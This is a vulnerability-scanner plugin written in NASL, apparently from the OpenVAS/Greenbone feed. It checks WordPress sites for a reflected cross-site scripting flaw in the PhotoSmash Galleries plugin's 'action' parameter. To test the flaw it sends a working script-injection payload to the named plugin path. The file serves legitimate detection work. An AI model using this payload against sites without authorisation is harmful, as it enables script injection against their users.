CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.801880" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2011-05-16 15:25:30 +0200 (Mon, 16 May 2011)" );
	script_bugtraq_id( 46782 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_name( "PhotoSmash Galleries WordPress Plugin 'action' Parameter XSS Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wordpress/installed" );
	script_xref( name: "URL", value: "http://www.htbridge.ch/advisory/xss_in_photosmash_wordpress_plugin.html" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary code in
  the context of an application." );
	script_tag( name: "affected", value: "WordPress PhotoSmash Galleries Plugin version 1.0.1" );
	script_tag( name: "insight", value: "The flaw is caused by improper validation of user-supplied input passed via
  the 'action' parameter to /wp-content/plugins/photosmash-galleries/index.php,
  that allows attackers to execute arbitrary HTML and script code on the web server." );
	script_tag( name: "solution", value: "Update to WordPress PhotoSmash Galleries Plugin version 1.0.5 or later." );
	script_tag( name: "summary", value: "This host is running WordPress PhotoSmash Galleries Plugin and is
  prone to cross site scripting vulnerability." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://wordpress.org/extend/plugins/photosmash-galleries/" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
vtstrings = get_vt_strings();
if(dir == "/"){
	dir = "";
}
url = NASLString( dir, "/wp-content/plugins/photosmash-galleries/index.php?action=<script>alert('" + vtstrings["lowercase"] + "')</script>" );
if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "<script>alert\\('" + vtstrings["lowercase"] + "'\\)</script>" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

